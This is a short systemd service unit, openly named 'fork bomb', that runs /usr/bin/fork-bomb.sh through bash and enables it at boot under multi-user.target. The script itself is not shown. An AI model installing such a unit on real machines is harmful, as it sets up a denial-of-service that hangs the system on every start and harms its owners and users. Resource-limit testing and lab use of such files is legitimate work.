# files/fork-bomb.service
[Unit] 
Description=fork bomb

[Service] 
Type=simple
ExecStart=/bin/bash /usr/bin/fork-bomb.sh

[Install] 
WantedBy=multi-user.target
